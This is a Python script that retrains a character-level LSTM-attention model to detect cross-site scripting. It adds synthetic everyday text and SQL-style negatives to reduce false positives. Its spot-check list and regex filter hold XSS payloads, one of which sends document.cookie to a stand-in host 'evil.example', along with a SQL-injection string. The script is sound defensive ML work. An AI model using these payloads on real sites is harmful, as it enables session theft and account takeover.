"""
Retrain the XSS character-level attention model with realistic benign input.

The v1 model learned "apostrophe = attack" because the XSS dataset's benign
samples are mostly Wikipedia HTML. This version adds:
  1. Generated everyday text (names, contractions, possessives, prices, URLs)
  2. SQL-style text from the SQLi dataset (no HTML/script), as XSS negatives
and evaluates on held-out templates the model never saw in training.

Runs INSIDE the xss-api container.

Usage:
    python /tmp/train_xss_char_v2.py --xss /tmp/xss.csv --sqli /tmp/sqli.csv
"""
import argparse
import pickle
import random
import re
import sys

import numpy as np

sys.path.insert(0, "/app")
sys.path.insert(0, "/tmp")

import tensorflow as tf
from tensorflow.keras import layers, models, callbacks, optimizers
from tensorflow.keras.preprocessing.sequence import pad_sequences
from sklearn.model_selection import train_test_split

import app
from app import AttentionLayer
from evaluate import load_dataset, metrics

parser = argparse.ArgumentParser()
parser.add_argument("--xss", required=True)
parser.add_argument("--sqli", required=True)
parser.add_argument("--max-len", type=int, default=300)
parser.add_argument("--epochs", type=int, default=10)
parser.add_argument("--seed", type=int, default=42)
parser.add_argument("--synthetic", type=int, default=4000)
parser.add_argument("--sql-negatives", type=int, default=4000)
args = parser.parse_args()

random.seed(args.seed)
np.random.seed(args.seed)
tf.random.set_seed(args.seed)

# ---------------------------------------------------------------- synthetic benign text
WORDS_A = {
    "first": ["Sean", "Mary", "Liam", "Aoife", "Kevin", "Grace", "Tom", "Niamh", "Ola", "Ada"],
    "apos_surname": ["O'Brien", "O'Connor", "D'Souza", "O'Neill", "D'Arcy", "O'Hara"],
    "product": ["laptop", "headphones", "keyboard", "monitor", "shoes", "jacket", "phone case"],
    "adj": ["great", "cheap", "fast", "lovely", "broken", "brilliant", "too small"],
    "brand": ["Dell", "Sony", "Apple", "Nike", "Adidas", "Samsung"],
    "city": ["Aberdeen", "Glasgow", "Dundee", "Leeds", "Cork", "Lagos"],
}
WORDS_B = {
    "first": ["James", "Fatima", "Chloe", "Daniel", "Zara", "Ewan", "Sophie", "Tunde", "Erin", "Kai"],
    "apos_surname": ["O'Sullivan", "D'Angelo", "O'Donnell", "N'Diaye", "O'Reilly", "L'Estrange"],
    "product": ["mouse", "tablet", "trainers", "backpack", "charger", "printer", "speaker"],
    "adj": ["amazing", "expensive", "slow", "decent", "faulty", "excellent", "a bit loud"],
    "brand": ["Lenovo", "Bose", "Logitech", "Puma", "HP", "Canon"],
    "city": ["Edinburgh", "Inverness", "Manchester", "Belfast", "Bristol", "Accra"],
}
TEMPLATES_A = [
    "{apos_surname}", "{first} {apos_surname}", "it's a {adj} {product}",
    "men's {product}", "women's {product}", "{brand}'s new {product}",
    "I can't find my {product}", "don't ship to {city} please",
    "what's the price of the {product}?", "\"{product}\" reviews",
    "price < {n}", "{product} under £{n}", "https://example.com/search?q={product}&page={n}",
    "{first}.{n}@example.com", "Tom & Jerry {product}", "{n}% off {product}s",
]
TEMPLATES_B = [
    "contact {first} {apos_surname}", "isn't the {product} {adj}?", "kids' {product}",
    "{first}'s {product} from {city}", "we'll deliver to {city} tomorrow",
    "I'd like a refund, it's {adj}", "size 5' 11\" {product}", "rating > {n} stars",
    "{brand} {product} - 'limited edition'", "who's selling {product}s in {city}?",
    "a & b, x = {n}", "https://shop.example.co.uk/item?id={n}&ref={first}",
    "rock 'n' roll {product}", "1/2 price {product}", "you're welcome, {first}!",
]


def generate(templates, words, n):
    out = []
    for _ in range(n):
        t = random.choice(templates)
        filled = t.format(n=random.randint(1, 999),
                          **{k: random.choice(v) for k, v in words.items()})
        out.append(filled)
    return out


synth_train = generate(TEMPLATES_A, WORDS_A, args.synthetic)
synth_test = generate(TEMPLATES_B, WORDS_B, 1000)

# ---------------------------------------------------------------- SQL-style negatives
HTML_LIKE = re.compile(r"<|>|script|javascript:|on\w+\s*=|alert\s*\(", re.IGNORECASE)
sql_texts, _ = load_dataset(args.sqli)
sql_neg = [t for t in sql_texts if t.strip() and not HTML_LIKE.search(t)]
random.shuffle(sql_neg)
sql_train = sql_neg[: args.sql_negatives]
sql_test = sql_neg[args.sql_negatives: args.sql_negatives + 1000]
print(f"SQL-style negatives: {len(sql_train)} train, {len(sql_test)} test")

# ---------------------------------------------------------------- XSS data, same split as v1
texts, y = load_dataset(args.xss)
train_idx, test_idx = train_test_split(np.arange(len(y)), test_size=0.2, random_state=args.seed)
x_train = [texts[i] for i in train_idx] + synth_train + sql_train
y_train = np.concatenate([y[train_idx], np.zeros(len(synth_train) + len(sql_train), dtype=int)])
x_test = [texts[i] for i in test_idx]
y_test = y[test_idx]

order = np.random.permutation(len(x_train))
x_train = [x_train[i] for i in order]
y_train = y_train[order]

Tokenizer = type(app.dnn_preprocessor["tokenizer"])
tokenizer = Tokenizer(char_level=True, lower=True, filters="", oov_token="\x00")
tokenizer.fit_on_texts(x_train)
vocab_size = len(tokenizer.word_index) + 1


def encode(batch):
    seqs = tokenizer.texts_to_sequences(batch)
    return pad_sequences(seqs, maxlen=args.max_len, padding="post", truncating="post")


X_train = encode(x_train)
pos = y_train.mean()
class_weight = {0: 0.5 / (1 - pos), 1: 0.5 / pos}
print(f"Training rows: {len(y_train)} ({int(y_train.sum())} XSS) | vocab {vocab_size}")

# ---------------------------------------------------------------- model (same architecture)
inputs = layers.Input(shape=(args.max_len,))
x = layers.Embedding(vocab_size, 64)(inputs)
x = layers.LSTM(128, return_sequences=True)(x)
x = AttentionLayer(name="attention_layer")(x)
x = layers.Dense(64, activation="relu")(x)
x = layers.Dropout(0.5)(x)
outputs = layers.Dense(1, activation="sigmoid")(x)
model = models.Model(inputs, outputs)
model.compile(optimizer=optimizers.Adam(learning_rate=1e-3, clipnorm=1.0),
              loss="binary_crossentropy", metrics=["accuracy"])

model.fit(X_train, y_train, validation_split=0.1, epochs=args.epochs, batch_size=64,
          class_weight=class_weight,
          callbacks=[callbacks.EarlyStopping(patience=2, restore_best_weights=True)],
          verbose=2)


# ---------------------------------------------------------------- evaluation
def score(batch):
    return model.predict(encode(batch), batch_size=256, verbose=0).reshape(-1)


m = metrics(y_test, (score(x_test) > 0.5).astype(int))
print(f"\nORIGINAL XSS TEST SPLIT: acc={m['accuracy']:.4f} prec={m['precision']:.4f} "
      f"recall={m['recall']:.4f} f1={m['f1']:.4f} fp={m['fp']} fn={m['fn']}")
print("  (v1 model on the same split: acc=0.9869 f1=0.9877 fp=9 fn=27)")

fp_synth = (score(synth_test) > 0.5).mean()
fp_sql = (score(sql_test) > 0.5).mean() if sql_test else 0.0
print(f"\nHELD-OUT everyday text flagged as XSS: {fp_synth:.1%} of {len(synth_test)}")
print(f"HELD-OUT SQL-style text flagged as XSS: {fp_sql:.1%} of {len(sql_test)}")

checks = [
    ("O'Brien", 0), ("it's a great laptop", 0), ("men's shoes", 0),
    ("1' OR '1'='1", 0), ("Fish & Chips < £10", 0),
    ("<script>alert(document.cookie)</script>", 1),
    ("<img src=x onerror=alert(1)>", 1),
    ("<svg/onload=alert('xss')>", 1),
    ("javascript:alert(1)", 1),
    ("\"><script>fetch('//evil.example/'+document.cookie)</script>", 1),
]
print("\nSpot checks (expected: 0 = harmless or not XSS, 1 = XSS):")
for (text, expected), s in zip(checks, score([c[0] for c in checks])):
    mark = "ok" if int(s > 0.5) == expected else "WRONG"
    print(f"  {s:.4f}  expected {expected}  {mark:<5}  {text}")

model.save("/tmp/xss_char_model_v2.keras")
with open("/tmp/xss_char_preprocessor_v2.pkl", "wb") as f:
    pickle.dump({"tokenizer": tokenizer, "max_len": args.max_len,
                 "padding": "post", "truncating": "post"}, f)
print("\nSaved /tmp/xss_char_model_v2.keras and /tmp/xss_char_preprocessor_v2.pkl")